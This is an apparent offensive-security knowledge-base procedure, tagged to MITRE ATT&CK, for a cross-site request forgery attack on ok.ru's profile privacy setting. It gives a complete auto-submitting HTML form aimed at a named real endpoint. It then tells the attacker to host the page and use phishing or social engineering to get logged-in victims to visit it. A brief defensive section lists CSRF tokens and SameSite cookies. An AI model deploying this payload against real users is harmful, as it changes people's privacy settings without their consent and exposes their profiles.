---
tags:
  - csrf
  - web
  - exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 323b14c6-6146-4ee9-b1d4-e29f7def7be3
created_at: '2025-12-14T17:27:36.178Z'
updated_at: '2025-12-14T17:27:36.178Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-and-Execute-CSRF-Attack-to-Toggle-Privacy

## Summary

This procedure demonstrates crafting a malicious HTML page or link that exploits the CSRF vulnerability in ok.ru's profile privacy toggle, forcing unauthorized changes when visited by an authenticated victim.

## Description

Attackers create an external webpage with an auto-submitting form that sends a POST request to ok.ru's privacy endpoint. When a logged-in user visits the page (e.g., via phishing link), the browser uses the active session to execute the toggle, altering visibility from friends-only to public or vice versa. This leads to privacy violations without user awareness.

## Requirements

1. Knowledge of the target endpoint URL and parameters
2. Ability to host a malicious HTML page (e.g., on a web server)
3. Victim must be authenticated to ok.ru

## Defense

Defensive measures and detection strategies:

- Enforce CSRF token validation on POST endpoints
- Use SameSite cookies to restrict cross-site requests
- Log and alert on unexpected privacy setting changes

## Objectives

1. Forge a request to toggle privacy settings
2. Achieve unauthorized profile exposure or restriction
3. Validate impact on victim privacy

## Instructions

### Step 1: Craft Malicious HTML Form

**Context**: Create an HTML file with a hidden form that auto-submits to the ok.ru endpoint.

Write HTML like:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="https://ok.ru/settings/privacy/toggle" method="POST">
<input type="hidden" name="closed_profile" value="1">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

> Adjust parameters based on observed legitimate request (e.g., value=1 for enable, 0 for disable).

### Step 2: Host and Lure Victim

**Context**: Host the HTML on an attacker-controlled server and send a link to the victim.

Upload the file to a web host and distribute via email or social engineering. When victim clicks and visits while logged in, the form submits automatically.

> Expected: Victim's profile toggles; verify by checking their ok.ru settings.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[exploitation]]
